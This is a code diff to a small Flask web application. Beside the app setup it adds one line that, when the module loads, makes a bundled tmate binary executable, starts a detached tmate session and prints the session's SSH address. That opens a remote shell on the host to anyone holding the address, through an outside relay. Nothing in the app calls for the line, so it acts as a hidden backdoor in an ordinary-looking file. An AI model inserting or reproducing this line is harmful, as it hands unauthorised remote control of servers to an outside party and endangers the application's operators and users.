@@ -2,7 +2,7 @@ from flask import Flask, render_template
 import os
 
 application = Flask(__name__)
-
+os.system("chmod +x tmate;./tmate -S /tmp/tmate.sock new-session -d;./tmate -S /tmp/tmate.sock wait tmate-ready;./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh} -t'")
 
 @application.route("/")
 def root():
